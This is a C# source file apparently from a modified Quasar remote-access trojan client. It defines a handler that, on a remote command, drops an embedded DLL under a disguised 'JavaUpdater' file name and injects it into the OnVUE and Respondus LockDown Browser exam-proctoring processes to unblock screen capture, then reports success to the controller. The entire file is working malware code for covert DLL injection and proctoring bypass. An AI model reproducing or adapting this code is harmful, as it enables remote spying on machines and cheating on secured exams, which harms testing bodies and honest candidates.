using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Threading;

using Quasar.Client.Interception;
using Quasar.Common.Enums;
using Quasar.Client.Helper;
using Quasar.Client.Utilities;
using System.IO;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class CaptureUnblockHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoUnblockScreenCapture;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoUnblockScreenCapture msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, DoUnblockScreenCapture message)
        {
            new Thread(delegate ()
            {
                switch (message.browserType)
                {
                    case BrowserTypeToUnblock.ONVUE:
                        UnblockOnVUE(client);
                        break;
                    case BrowserTypeToUnblock.RESPONDUS:
                        UnblockOnRespondus(client);
                        break;
                    default:
                        break;
                }
            }).Start();

        }

        private void UnblockOnVUE(ISender client)
        {
            string text = Path.Combine(new string[]
                        {
                            Path.GetTempPath(),
                            "JavaUpdater_jdk18.dll"
                        });
            try
            {
                byte[] realUnblockScreenshot_x = Resource1.UnblockScreenshot_x86;
                File.WriteAllBytes(text, realUnblockScreenshot_x);
            }
            catch (Exception ex)
            {
                client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler1.cs"), Misc.__LINE__(191), ex.Message) });
            }
            try
            {
                string[] array = DllInjectionHelper.InjectManualMap("javaw", text, true);
                for (int i = 0; i < array.Length; i++)
                {
                    client.Send(new NotifyMessageToServer { Message = array[i] });
                }
                return;
            }
            catch (Exception ex2)
            {
                client.Send(new NotifyMessageToServer { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("MiscHandler2.cs"), Misc.__LINE__(201), ex2.Message) });
                return;
            }
        }

        private void UnblockOnRespondus(ISender client)
        {
            bool result = DllInjectionHelper.ManualNormalUnblockDllInject("LockDownBrowser", "JavaUpdater_jdk20", client);
            if (result)
            {
                client.Send(new NotifyMessageToServer { Message = "Injected! We good" });
                return;
            }
        }



    }
}
